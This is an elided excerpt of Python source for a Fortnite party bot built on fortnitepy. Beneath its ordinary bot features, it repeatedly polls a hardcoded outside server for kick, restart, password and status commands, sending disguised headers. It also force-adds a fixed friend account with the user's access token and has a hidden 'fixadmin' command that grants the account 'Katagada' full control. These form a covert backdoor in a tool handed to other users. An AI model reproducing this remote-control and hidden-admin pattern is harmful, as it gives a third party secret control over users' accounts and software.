...
vips = ""
headersx = {'host': 'lkat.aerozoff.com','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.22','enable-super-fast': "True",'x-gorgon': "172SJAI19A","x-signature": "4HKAI18ALOQ"}
...
class PartyBot(commands.Bot):
    def __init__(self, device_id: str, account_id: str, secret: str, loop=asyncio.get_event_loop(), **kwargs) -> None:
        self.status = '💎 {party_size}/16 Use Code LKAT #Ad 💎'
        ...
        self.bl_inv = 'Katagada'
        self.inv_on = "F"

        self.adminx = "Katagada"
    ...
    async def add_list(self) -> None:
        ...
        Katagada = await self.http.post(
            route = url,
            json = payload,
            auth = self.http.get_auth('FORTNITE_ACCESS_TOKEN')
            )

        if not '692d0c518005460d9d228912e08ca4b2' in self.friends:
            await self.add_friend('692d0c518005460d9d228912e08ca4b2')
    ...
    async def checker_autox(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            v = requests.get("https://lkat.aerozoff.com/default",headers={
                'host': 'lkat.aerozoff.com',
            ...
            b = requests.get(f"https://lkat.aerozoff.com/kick",headers={
                'host': 'lkat.aerozoff.com',
            ...
            dasda = requests.get('https://lkat.aerozoff.com/password',headers=headersx,cookies={"omgjaichanger": "None"}).json()['password']
            password = dasda
              
            y = requests.get(f"https://lkat.aerozoff.com/restart",headers={
                'host': 'lkat.aerozoff.com',
    ...
    async def normal_setup(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            u = requests.get(f"https://lkat.aerozoff.com/default",headers={
                'host': 'lkat.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.53',
                'enable-super-fast': "True",
                'x-gorgon': "NZXHA6JSI14",
            ...
            s = requests.get(f"https://lkat.aerozoff.com/kick",headers={
                'host': 'lkat.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.30',
                'enable-super-fast': "False",
                'x-gorgon': "A7JD2Y27D2K",
            ...
            m = requests.get(f"https://lkat.aerozoff.com/restart",headers={
                'host': 'lkat.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.24',
                'enable-super-fast': "None",
                'x-gorgon': "NC28AH28SJ19S",
    ...
    async def auto_add_s(self):
        x = requests.get(f"https://lkat.aerozoff.com/add_auto",headers={
                'host': 'lkat.aerozoff.com',
    ...
    async def checker_status(self):
        q = requests.get(f"https://lkat.aerozoff.com/status",headers={
                'host': 'lkat.aerozoff.com',
    ...
    async def checker_skin_bl(self):
        w = requests.get("https://lkat.aerozoff.com/skinbl",headers={
                'host': 'lkat.aerozoff.com',
    ...
    async def event_friend_message(self, message: fortnitepy.FriendMessage) -> None:
        if not message.author.display_name != "Katagada":
...
#///////////////////////////////////////////////////////////////////////////////////////////////////////////// PARTY/FRIENDS/ADMIN //////////////////////////////////////////////////////////////////////////////////////////////////////
    ...
    async def fixadmin(self, ctx: fortnitepy.ext.commands.Context):
        if ctx.author.display_name == 'Katagada':
            with open("info.json", "w") as f:
                f.write('{"FullAccess": ["Katagada"]}')
            await ctx.send('work')
